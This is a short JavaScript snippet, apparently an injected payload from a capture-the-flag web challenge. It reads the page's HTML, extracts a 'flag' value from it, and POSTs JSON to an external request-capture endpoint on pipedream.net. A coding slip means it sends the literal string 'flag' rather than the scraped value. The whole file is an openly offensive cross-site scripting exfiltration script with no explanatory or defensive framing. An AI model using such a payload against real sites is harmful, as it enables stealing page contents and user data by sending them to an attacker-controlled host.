console.log('inject')
body_text = document.body.innerHTML;
flag = body_text.slice(body_text.lastIndexOf('>') + 1);

const headers = new Headers()
headers.append("Content-Type", "application/json")

const body = { "flag": "flag" }

const options = {
  method: "POST",
  headers,
  mode: "cors",
  body: JSON.stringify(body),
}

fetch("https://en8uw5kigq9nx.x.pipedream.net/", options)
